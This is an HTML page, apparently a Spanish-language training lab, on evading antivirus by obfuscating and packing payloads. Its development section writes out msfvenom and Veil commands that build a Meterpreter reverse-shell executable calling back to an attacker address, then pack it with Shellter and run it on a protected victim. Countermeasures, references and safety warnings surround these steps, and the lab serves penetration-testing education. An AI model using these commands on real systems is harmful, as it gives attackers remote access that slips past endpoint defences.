<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Lab 24 ‚Äì Evasi√≥n de antivirus mediante ofuscaci√≥n de payloads y t√©cnicas de empaquetado</title>
  <link rel="icon" href="/el-pergamino-digital/assets/favicon.png" type="image/png" />
  <style>
    :root { color-scheme: dark; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #121212;
      color: #e0e0e0;
      margin: 0;
      padding: 2em;
      line-height: 1.6;
    }
    h1, h2 {
      color: #90caf9;
    }
    code {
      background-color: #1e1e1e;
      padding: 0.2em 0.4em;
      border-radius: 4px;
      font-family: Consolas, monospace;
    }
    pre {
      background-color: #1e1e1e;
      padding: 1em;
      border-radius: 6px;
      overflow-x: auto;
    }
    a {
      color: #90caf9;
    }
  </style>
</head>
<body>

  <h1>Lab 24 ‚Äì Evasi√≥n de antivirus mediante ofuscaci√≥n de payloads y t√©cnicas de empaquetado</h1>
  <h2>Transformaci√≥n de binarios maliciosos para evitar detecci√≥n por motores antivirus tradicionales</h2>

  <section>
    <h2>1. Objetivo</h2>
    <p>Este laboratorio permite al analista ofensivo comprender c√≥mo los motores antivirus detectan amenazas y c√≥mo pueden ser evadidos mediante t√©cnicas de ofuscaci√≥n, cifrado y empaquetado. Se exploran herramientas que modifican la firma de un payload sin alterar su funcionalidad, permitiendo su ejecuci√≥n en entornos protegidos. El objetivo es evaluar la eficacia de los antivirus y reforzar la detecci√≥n basada en comportamiento.</p>
  </section>

  <section>
    <h2>2. Nivel de dificultad</h2>
    <p>Avanzado</p>
  </section>

  <section>
    <h2>3. Herramientas utilizadas</h2>
    <ul>
      <li><code>msfvenom</code></li>
      <li><code>Veil</code></li>
      <li><code>Shellter</code></li>
      <li><code>PEStudio</code></li>
      <li><code>VirusTotal</code> (solo para an√°lisis, no para subir malware real)</li>
    </ul>
  </section>

  <section>
    <h2>4. Entorno de laboratorio</h2>
    <p>M√°quina atacante con Kali Linux, m√°quina v√≠ctima con antivirus activo (Windows Defender o similar), red virtual controlada, snapshot de restauraci√≥n.</p>
  </section>

  <section>
    <h2>5. Escenario</h2>
    <p>Un analista ofensivo necesita ejecutar un payload en una m√°quina protegida por antivirus. El objetivo es modificar el binario para evadir la detecci√≥n, sin alterar su funcionalidad, y evaluar la respuesta del sistema defensivo.</p>
  </section>

  <section>
    <h2>6. Pasos previos</h2>
    <ul>
      <li>Generar un payload con <code>msfvenom</code> en formato <code>.exe</code></li>
      <li>Verificar que el antivirus detecta el binario original</li>
      <li>Instalar y configurar Veil y Shellter en Kali</li>
      <li>Preparar entorno de an√°lisis con PEStudio y sandbox</li>
    </ul>
  </section>

  <section>
    <h2>7. Desarrollo</h2>
    <ol>
      <li>Generar payload con <code>msfvenom</code>:
        <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe</code></pre>
      </li>
      <li>Analizar el binario con PEStudio y comprobar detecci√≥n en VirusTotal (sin subirlo si es real)</li>
      <li>Ofuscar el payload con Veil:
        <pre><code>veil -t Evasion -p windows/meterpreter/reverse_tcp --ip 192.168.1.100 --port 4444</code></pre>
      </li>
      <li>Empaquetar el binario con Shellter en modo autom√°tico</li>
      <li>Comparar detecci√≥n antes y despu√©s de la ofuscaci√≥n</li>
      <li>Ejecutar en m√°quina v√≠ctima y observar comportamiento del antivirus</li>
    </ol>
  </section>

    <section>
    <h2>8. Resultados esperados</h2>
    <ul>
      <li>Detecci√≥n del payload original por el antivirus</li>
      <li>Reducci√≥n de detecci√≥n tras aplicar t√©cnicas de ofuscaci√≥n</li>
      <li>Ejecuci√≥n exitosa del payload en la m√°quina v√≠ctima</li>
      <li>Comparaci√≥n entre firmas antes y despu√©s de la transformaci√≥n</li>
    </ul>
  </section>

  <section>
    <h2>9. An√°lisis de resultados</h2>
    <p>Los antivirus tradicionales se basan en firmas est√°ticas y heur√≠sticas. Al modificar la estructura del binario sin alterar su funcionalidad, se puede evitar la detecci√≥n. La comparaci√≥n entre el comportamiento del antivirus ante el payload original y el ofuscado permite evaluar la eficacia de las t√©cnicas evasivas.</p>
  </section>

  <section>
    <h2>10. Conclusiones</h2>
    <p>La evasi√≥n de antivirus es posible mediante t√©cnicas de ofuscaci√≥n y empaquetado. Sin embargo, estas t√©cnicas deben usarse con responsabilidad y √∫nicamente en entornos controlados. La detecci√≥n basada en comportamiento y an√°lisis din√°mico es m√°s efectiva que las firmas est√°ticas.</p>
  </section>

  <section>
    <h2>11. Medidas</h2>
    <ul>
      <li>Registrar detecci√≥n del payload original y del ofuscado</li>
      <li>Comparar hashes, firmas y comportamiento en ejecuci√≥n</li>
      <li>Documentar herramientas y par√°metros utilizados</li>
    </ul>
  </section>

  <section>
    <h2>12. Contramedidas</h2>
    <ul>
      <li>Implementar an√°lisis din√°mico y sandboxing</li>
      <li>Actualizar motores antivirus y reglas heur√≠sticas</li>
      <li>Aplicar listas blancas de aplicaciones firmadas</li>
      <li>Correlacionar eventos en SIEM para detectar ejecuci√≥n an√≥mala</li>
    </ul>
  </section>

  <section>
    <h2>13. Riesgos y advertencias</h2>
    <p>El uso de payloads ofuscados puede activar mecanismos de defensa avanzados o generar falsos negativos. Este laboratorio debe ejecutarse √∫nicamente en entornos controlados. No subir binarios reales a VirusTotal ni ejecutarlos en sistemas de producci√≥n.</p>
  </section>

  <section>
    <h2>14. Evidencias</h2>
    <p><em>Espacio reservado para capturas de pantalla de PEStudio, Veil, Shellter, an√°lisis de firmas y comportamiento del antivirus.</em></p>
  </section>

  <section>
    <h2>15. Validaci√≥n cruzada</h2>
    <ul>
      <li><a href="https://attack.mitre.org/techniques/T1027/" target="_blank">MITRE ATT&CK T1027 ‚Äì Obfuscated Files or Information</a></li>
      <li><a href="https://www.cisecurity.org/controls/malware-defenses" target="_blank">CIS Control 10 ‚Äì Malware Defenses</a></li>
      <li><a href="https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final" target="_blank">NIST SP 800-83 ‚Äì Guide to Malware Incident Prevention and Handling</a></li>
    </ul>
  </section>

  <section>
    <h2>16. Glosario asociado</h2>
    <ul>
      <li><strong>Ofuscaci√≥n:</strong> T√©cnica para alterar la apariencia de un c√≥digo o binario sin cambiar su funcionalidad</li>
      <li><strong>Empaquetado:</strong> Proceso de encapsular un ejecutable para modificar su firma</li>
      <li><strong>Sandbox:</strong> Entorno controlado para ejecutar c√≥digo sospechoso sin riesgo</li>
      <li><strong>Heur√≠stica:</strong> T√©cnica de detecci√≥n basada en comportamiento o patrones sospechosos</li>
      <li><strong>Payload:</strong> Carga √∫til que ejecuta una acci√≥n espec√≠fica, como una shell reversa</li>
    </ul>
  </section>

  <section>
    <h2>17. Preguntas de refuerzo</h2>
    <ol>
      <li>¬øQu√© diferencia hay entre detecci√≥n por firma y por comportamiento?</li>
      <li>¬øQu√© t√©cnicas permiten modificar la firma de un binario?</li>
      <li>¬øQu√© riesgos implica subir un payload real a VirusTotal?</li>
      <li>¬øC√≥mo puede un sandbox ayudar a detectar malware ofuscado?</li>
      <li>¬øQu√© herramientas permiten empaquetar un ejecutable sin alterar su funcionalidad?</li>
    </ol>
  </section>

    <section>
    <h2>18. R√∫brica de evaluaci√≥n</h2>
    <ul>
      <li>‚úîÔ∏è Ejecuta correctamente t√©cnicas de ofuscaci√≥n y empaquetado</li>
      <li>‚úîÔ∏è Eval√∫a la respuesta del antivirus ante cada variante</li>
      <li>‚úîÔ∏è Relaciona t√©cnicas con est√°ndares y certificaciones</li>
      <li>‚úîÔ∏è Aplica medidas y contramedidas con criterio t√©cnico</li>
    </ul>
  </section>

  <section>
    <h2>19. Recursos complementarios</h2>
    <ul>
      <li><a href="https://www.veil-framework.com/" target="_blank">Veil Framework</a></li>
      <li><a href="https://www.shellterproject.com/" target="_blank">Shellter ‚Äì Dynamic Shellcode Injection</a></li>
      <li><a href="https://www.winitor.com/pestudio/" target="_blank">PEStudio ‚Äì Malware Analysis Tool</a></li>
      <li><a href="https://www.virustotal.com/" target="_blank">VirusTotal ‚Äì Online Malware Scanner</a></li>
    </ul>
  </section>

  <section>
    <h2>20. Cr√©ditos y licencia</h2>
    <p>Este laboratorio forma parte del proyecto <a href="https://pergamino-digital-ciberseguridad.blogspot.com/?m=1" target="_blank">El Pergamino Digital</a>. Su uso est√° autorizado √∫nicamente con fines educativos, respetando la trazabilidad editorial y la licencia CC BY-NC-SA 4.0.</p>
  </section>

  <section>
    <h2>21. Nivel de certificaci√≥n</h2>
    <p>Avanzado ‚Äì Alineado con OSCP, CRTO y eCPTXv2.</p>
  </section>

  <section>
    <h2>22. Mapa de integraci√≥n</h2>
    <ul>
      <li>üîó Contin√∫a el enfoque del <strong>Lab 23</strong> (Bypass de WAF y evasi√≥n avanzada)</li>
      <li>üß™ Refuerza el dominio de evasi√≥n en capa de endpoint y an√°lisis de firmas</li>
      <li>üéì Integra conceptos clave del simulador certificador: <em>Payload Obfuscation</em>, <em>AV Evasion</em>, <em>Binary Repacking</em></li>
    </ul>
  </section>

</body>
</html>
